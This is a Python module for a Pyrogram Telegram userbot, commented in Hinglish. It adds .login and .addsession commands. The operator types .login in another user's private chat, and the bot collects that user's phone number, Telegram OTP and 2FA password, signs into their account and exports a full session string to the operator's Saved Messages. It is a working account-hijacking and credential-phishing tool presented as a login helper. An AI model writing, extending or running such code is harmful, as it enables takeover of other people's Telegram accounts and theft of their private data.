"""
.login / .addsession / .cancellogin / .mylogin

OWNER + sudo only.
Flow:
  1. Kisi DM me `.login` likho
  2. Phone (+91xxxxxxxxxx) bhejo
  3. OTP bhejo
  4. Agar 2FA ho to password bhejo
  5. Session string SIRF OWNER ke Saved Messages me jayegi

.addsession <string> — direct session save (Saved Messages)
"""
import asyncio
from typing import Any

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import (
    PhoneCodeInvalid,
    PhoneCodeExpired,
    PhoneNumberInvalid,
    PhoneNumberBanned,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
)

from core.clients import app
from config import API_ID, API_HASH, OWNER_ID
from modules.owner.sudoers import owner_or_sudo, SUDO_USERS

PREFIXES = [".", "!"]

# chat_id -> state dict
_LOGIN: dict[int, dict[str, Any]] = {}
# operator (owner/sudo) armed — next private chat they open with .login
_ARMED: set[int] = set()


def _is_op(uid: int | None) -> bool:
    if uid is None:
        return False
    if OWNER_ID and uid == OWNER_ID:
        return True
    return uid in SUDO_USERS


async def _send_to_saved(text: str):
    """Session / secrets ONLY to owner's Saved Messages."""
    try:
        await app.send_message("me", text)
        return True
    except Exception as e:
        print(f"[login] Saved Messages fail: {e}")
        return False


async def _cleanup_temp(state: dict):
    temp = state.get("temp_client")
    if temp:
        try:
            await temp.disconnect()
        except Exception:
            pass
        state["temp_client"] = None


@app.on_message(filters.command(["login"], prefixes=PREFIXES))
@owner_or_sudo
async def login_cmd(client, message: Message):
    """Start login in current private chat, or arm for next DM."""
    me = await client.get_me()
    op_id = message.from_user.id if message.from_user else me.id

    if message.chat.type.name.lower() != "private":
        _ARMED.add(op_id)
        await message.reply_text(
            "🔑 <b>LOGIN ARMED</b>\n\n"
            "Ab jis user ke <b>DM</b> me jao aur wahan likho:\n"
            "<code>.login</code>\n\n"
            "Phir phone → OTP → password flow chalega.\n"
            "Session <b>sirf Saved Messages</b> me save hogi.\n\n"
            "Cancel: <code>.cancellogin</code>"
        )
        return

    chat_id = message.chat.id
    # cancel previous for this chat
    if chat_id in _LOGIN:
        await _cleanup_temp(_LOGIN[chat_id])

    _LOGIN[chat_id] = {
        "step": "phone",
        "op_id": op_id,
        "phone": None,
        "phone_code_hash": None,
        "temp_client": None,
    }
    _ARMED.discard(op_id)

    await message.reply_text(
        "🔑 <b>LOGIN STARTED</b>\n"
        "━━━━━━━━━━━━━━━━\n\n"
        "📱 <b>Step 1:</b> Phone number bhejo\n"
        "Format: <code>+91XXXXXXXXXX</code>\n\n"
        "Phir OTP aayega → yahan bhejo.\n"
        "2FA ho to password bhejo.\n\n"
        "🔐 Session <b>sirf mere Saved Messages</b> me jayegi.\n"
        "❌ Cancel: <code>.cancellogin</code>"
    )


@app.on_message(filters.command(["cancellogin", "logoutlogin"], prefixes=PREFIXES))
@owner_or_sudo
async def cancellogin_cmd(client, message: Message):
    op_id = message.from_user.id if message.from_user else 0
    _ARMED.discard(op_id)
    chat_id = message.chat.id
    if chat_id in _LOGIN:
        await _cleanup_temp(_LOGIN[chat_id])
        del _LOGIN[chat_id]
        await message.reply_text("✅ Login cancel ho gaya.")
    else:
        await message.reply_text("Koi active login nahi.")


@app.on_message(filters.command(["addsession"], prefixes=PREFIXES))
@owner_or_sudo
async def addsession_cmd(client, message: Message):
    """Save an existing session string to Saved Messages only."""
    if len(message.command) < 2:
        await message.reply_text(
            "Usage:\n<code>.addsession SESSION_STRING</code>\n\n"
            "Session sirf Saved Messages me save hogi."
        )
        return

    session = message.text.split(None, 1)[1].strip()
    if len(session) < 20:
        await message.reply_text("❌ Session string bahut short / invalid.")
        return

    # Try validate by connecting briefly
    status = await message.reply_text("⏳ Session check…")
    temp = Client(
        name="validate_sess",
        api_id=API_ID,
        api_hash=API_HASH,
        session_string=session,
        in_memory=True,
    )
    try:
        await temp.connect()
        me = await temp.get_me()
        await temp.disconnect()
        name = me.first_name or ""
        uname = f"@{me.username}" if me.username else "—"
        body = (
            "🔑 <b>SESSION SAVED</b> (addsession)\n"
            "━━━━━━━━━━━━━━━━\n"
            f"👤 <b>{name}</b>\n"
            f"🔗 {uname}\n"
            f"🆔 <code>{me.id}</code>\n\n"
            f"<code>{session}</code>"
        )
        ok = await _send_to_saved(body)
        if ok:
            await status.edit_text(
                f"✅ Session valid — <b>{name}</b> (<code>{me.id}</code>)\n"
                "Saved Messages me bhej diya 🔐"
            )
        else:
            await status.edit_text(
                "✅ Session valid, lekin Saved Messages fail.\n"
                "String yahan (sirf aapko dikhe):\n"
                f"<code>{session[:30]}…</code>"
            )
    except Exception as e:
        try:
            await temp.disconnect()
        except Exception:
            pass
        await status.edit_text(f"❌ Invalid session:\n<code>{type(e).__name__}: {e}</code>")

    # delete command message so session not left in group/dm history if possible
    try:
        await message.delete()
    except Exception:
        pass


@app.on_message(filters.command(["mylogin", "logins"], prefixes=PREFIXES))
@owner_or_sudo
async def mylogin_cmd(client, message: Message):
    active = len(_LOGIN)
    armed = len(_ARMED)
    await message.reply_text(
        f"🔑 <b>Login status</b>\n"
        f"Active flows: <code>{active}</code>\n"
        f"Armed operators: <code>{armed}</code>\n\n"
        f"<code>.login</code> — start\n"
        f"<code>.addsession</code> — paste string\n"
        f"<code>.cancellogin</code> — cancel"
    )


@app.on_message(
    filters.private & filters.text & ~filters.command(
        ["login", "cancellogin", "logoutlogin", "addsession", "mylogin", "logins"],
        prefixes=PREFIXES,
    ),
    group=-5,
)
async def login_steps(client, message: Message):
    """Handle phone / OTP / 2FA for active login chats."""
    chat_id = message.chat.id
    state = _LOGIN.get(chat_id)
    if not state:
        return

    # Only process if message is from operator OR from the other party in DM
    # (owner may type on behalf of user, or user types themselves)
    text = (message.text or "").strip()
    if not text or text.startswith(".") or text.startswith("!"):
        return

    step = state.get("step")

    # ---------- PHONE ----------
    if step == "phone":
        phone = text.replace(" ", "").replace("-", "")
        if not phone.startswith("+") or not phone[1:].isdigit() or len(phone) < 10:
            await message.reply_text(
                "❌ Invalid phone.\nExample: <code>+919876543210</code>"
            )
            return

        status = await message.reply_text("📤 Code bhej rahe hain…")
        temp = Client(
            name=f"login_{chat_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True,
        )
        try:
            await temp.connect()
            sent = await temp.send_code(phone)
            state["phone"] = phone
            state["phone_code_hash"] = sent.phone_code_hash
            state["temp_client"] = temp
            state["step"] = "code"
            await status.edit_text(
                "✅ Code bhej diya Telegram pe.\n\n"
                "📨 <b>Step 2:</b> OTP / code yahan bhejo\n"
                "(Telegram app me jo code aaya)"
            )
        except FloodWait as e:
            await _cleanup_temp({"temp_client": temp})
            await status.edit_text(f"⏳ FloodWait: {e.value}s baad try karo.")
            _LOGIN.pop(chat_id, None)
        except PhoneNumberInvalid:
            await _cleanup_temp({"temp_client": temp})
            await status.edit_text("❌ Phone number invalid.")
        except PhoneNumberBanned:
            await _cleanup_temp({"temp_client": temp})
            await status.edit_text("❌ Ye number Telegram se banned hai.")
        except Exception as e:
            await _cleanup_temp({"temp_client": temp})
            await status.edit_text(f"❌ Error: <code>{type(e).__name__}: {e}</code>")
            _LOGIN.pop(chat_id, None)
        return

    # ---------- OTP ----------
    if step == "code":
        code = text.replace(" ", "").replace("-", "")
        if not code.isdigit():
            await message.reply_text("❌ Sirf OTP digits bhejo.")
            return

        temp: Client = state.get("temp_client")
        if not temp:
            await message.reply_text("❌ Session lost. Phir se <code>.login</code>")
            _LOGIN.pop(chat_id, None)
            return

        status = await message.reply_text("🔐 Sign in…")
        try:
            await temp.sign_in(
                phone_number=state["phone"],
                phone_code_hash=state["phone_code_hash"],
                phone_code=code,
            )
            sess = await temp.export_session_string()
            me = await temp.get_me()
            await temp.disconnect()
            state["temp_client"] = None
            _LOGIN.pop(chat_id, None)

            name = me.first_name or ""
            uname = f"@{me.username}" if me.username else "—"
            body = (
                "🔑 <b>NEW SESSION</b> (.login)\n"
                "━━━━━━━━━━━━━━━━\n"
                f"👤 <b>{name}</b>\n"
                f"🔗 {uname}\n"
                f"🆔 <code>{me.id}</code>\n"
                f"📱 <code>{state['phone']}</code>\n\n"
                f"<code>{sess}</code>"
            )
            ok = await _send_to_saved(body)
            await status.edit_text(
                f"✅ <b>Login success!</b>\n"
                f"👤 {name} | <code>{me.id}</code>\n"
                + ("🔐 Session → <b>Saved Messages</b>" if ok else "⚠️ Saved Messages fail")
            )
        except SessionPasswordNeeded:
            state["step"] = "password"
            await status.edit_text(
                "🔒 <b>2FA ON hai</b>\n\n"
                "<b>Step 3:</b> Cloud password yahan bhejo"
            )
        except PhoneCodeInvalid:
            await status.edit_text("❌ OTP galat. Phir se code bhejo.")
        except PhoneCodeExpired:
            await _cleanup_temp(state)
            _LOGIN.pop(chat_id, None)
            await status.edit_text("❌ OTP expire. Phir se <code>.login</code>")
        except FloodWait as e:
            await status.edit_text(f"⏳ FloodWait {e.value}s")
        except Exception as e:
            await _cleanup_temp(state)
            _LOGIN.pop(chat_id, None)
            await status.edit_text(f"❌ <code>{type(e).__name__}: {e}</code>")
        return

    # ---------- 2FA PASSWORD ----------
    if step == "password":
        password = text
        temp: Client = state.get("temp_client")
        if not temp:
            await message.reply_text("❌ Session lost. <code>.login</code> dobara.")
            _LOGIN.pop(chat_id, None)
            return

        status = await message.reply_text("🔐 2FA check…")
        try:
            await temp.check_password(password)
            sess = await temp.export_session_string()
            me = await temp.get_me()
            await temp.disconnect()
            state["temp_client"] = None
            _LOGIN.pop(chat_id, None)

            name = me.first_name or ""
            uname = f"@{me.username}" if me.username else "—"
            body = (
                "🔑 <b>NEW SESSION</b> (.login + 2FA)\n"
                "━━━━━━━━━━━━━━━━\n"
                f"👤 <b>{name}</b>\n"
                f"🔗 {uname}\n"
                f"🆔 <code>{me.id}</code>\n"
                f"📱 <code>{state.get('phone')}</code>\n\n"
                f"<code>{sess}</code>"
            )
            ok = await _send_to_saved(body)
            await status.edit_text(
                f"✅ <b>Login success!</b>\n"
                f"👤 {name} | <code>{me.id}</code>\n"
                + ("🔐 Session → <b>Saved Messages</b>" if ok else "⚠️ Saved Messages fail")
            )
        except PasswordHashInvalid:
            await status.edit_text("❌ Password galat. Phir se bhejo.")
        except Exception as e:
            await _cleanup_temp(state)
            _LOGIN.pop(chat_id, None)
            await status.edit_text(f"❌ <code>{type(e).__name__}: {e}</code>")
        return
